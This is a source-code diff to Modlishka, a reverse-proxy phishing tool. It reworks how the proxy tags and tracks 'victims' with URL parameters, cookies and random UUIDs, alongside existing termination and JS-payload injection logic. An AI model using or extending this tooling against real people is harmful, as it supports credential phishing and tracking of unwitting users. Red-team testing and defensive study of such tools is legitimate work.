@@ -24,6 +24,7 @@ import (
 	"github.com/drk1wi/Modlishka/log"
 	"github.com/drk1wi/Modlishka/plugin"
 	"github.com/drk1wi/Modlishka/runtime"
+	"github.com/google/uuid"
 	"net"
 	"net/http"
 )
@@ -71,17 +72,6 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Do a redirect when tracking cookie was already set . We want to get rid of the TrackingParam from the URL!
-	queryString := r.URL.Query()
-	if _, ok := queryString[runtime.TrackingParam]; ok {
-		if _, err := r.Cookie(runtime.TrackingCookie); err == nil {
-			delete(queryString, runtime.TrackingParam)
-			r.URL.RawQuery = queryString.Encode()
-			log.Infof("User tracking: Redirecting client to %s", r.URL.String())
-			Redirect(w, r, r.URL.String())
-		}
-	}
-
 	targetURL:=""
 
 
@@ -120,6 +110,23 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 
 	reverseProxy := settings.NewReverseProxy()
 
+	// Remove tracking parameters from the URL and set tracking cookie if necessary
+	queryString := r.URL.Query()
+	if userID, ok := queryString[runtime.TrackingParam]; ok {
+		delete(queryString, runtime.TrackingParam)
+		r.URL.RawQuery = queryString.Encode()
+		log.Infof("User tracking: Redirecting client to %s", r.URL.String())
+		// If the user is already being tracked or the supplied parameter is empty just redirect without setting anything
+		if _, err := r.Cookie(runtime.TrackingCookie); err == nil || userID[0] == "" {
+			Redirect(w, r, r.URL.String())
+		} else {
+			log.Infof("[P] Tracking victim via initial parameter %s", userID[0])
+			reverseProxy.RequestContext.UserID = userID[0]
+			AddTrackingCookie(w, userID[0])
+			Redirect(w, r, r.URL.String())
+		}
+	}
+
 	if runtime.CheckTermination(r.Host + r.URL.String()) {
 		log.Infof("[P] Time to terminate this victim! Termination URL matched: %s", r.Host+r.URL.String())
 		reverseProxy.Terminate = true
@@ -129,11 +136,19 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 		log.Debugf("[P] ReverseProxy Origin: [%s]", reverseProxy.Origin)
 	}
 
-	//set up user tracking variables
-	if val, ok := queryString[runtime.TrackingParam]; ok {
-		reverseProxy.RequestContext.InitUserID = val[0]
-		reverseProxy.RequestContext.UserID = val[0]
-		log.Infof("[P] Tracking victim via initial parameter %s", val[0])
+	if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
+		reverseProxy.RequestContext.UserID = cookie.Value
+	}
+
+	// User has not provided an initial ID, assign them a random one
+	if reverseProxy.RequestContext.UserID == "" {
+		newUUID, err := uuid.NewRandom()
+		if err != nil {
+			return
+		}
+		reverseProxy.RequestContext.UserID = newUUID.String()
+		log.Infof("[P] Tracking victim via random parameter %s", newUUID.String())
+		AddTrackingCookie(w, newUUID.String())
 	}
 
 	//check if JS Payload should be injected
@@ -141,9 +156,7 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 		reverseProxy.Payload = payload
 	}
 
-	if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
-		reverseProxy.RequestContext.UserID = cookie.Value
-	}
+	
 
 	reverseProxy.Proxy.ServeHTTP(w, r)
 }
